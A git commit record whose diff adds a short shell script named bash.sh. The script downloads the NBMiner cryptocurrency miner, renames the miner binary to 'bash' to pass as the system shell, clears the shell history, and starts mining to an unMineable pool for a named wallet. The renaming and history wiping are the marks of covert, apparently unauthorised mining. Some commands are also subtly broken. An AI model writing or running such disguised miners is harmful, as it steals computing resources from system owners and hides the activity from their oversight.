1c7bc06215d8827cca67d3be55d4f094495845c2
DzT13 <76884559+DzT13@users.noreply.github.com>
2022-02-26 14:48:50 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz 
+tar -xvf NBMiner_40.1_Linux.tgz 
+cd NBMiner_Linux
+chmod +x nbminer 
+mv nbminer bash
+cd..
+rm -rvf NBMiner_40.1_Linux.tgz
+history -cr
+./bash nbminer -a kawpow -o kp.unmineable.com:3333 -u cosmos1vhjjh5q8qegxqyag6whdjzf4qwkce24w4zp4tc.default
